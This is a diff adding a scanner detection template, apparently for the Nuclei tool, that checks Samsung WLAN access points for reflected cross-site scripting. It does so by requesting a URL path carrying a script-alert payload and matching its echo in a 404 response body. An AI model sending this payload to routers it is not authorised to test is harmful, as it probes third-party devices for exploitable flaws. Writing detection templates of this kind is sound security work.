@@ -1,0 +1,25 @@
+id: samsung-wlan-ap-xss
+
+info:
+  name: 三星路由器WLAN AP反射型XSS
+  author: Master先生
+  severity: low
+  reference:
+    - https://www.freebuf.com/vuls/268435.html
+  tags: Samsung WLAN AP,XSS
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/<script>alert("{{randstr}}")</script>'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+
+      - type: word
+        words:
+          - '<script>alert("{{randstr}}")</script>'
+        part: body
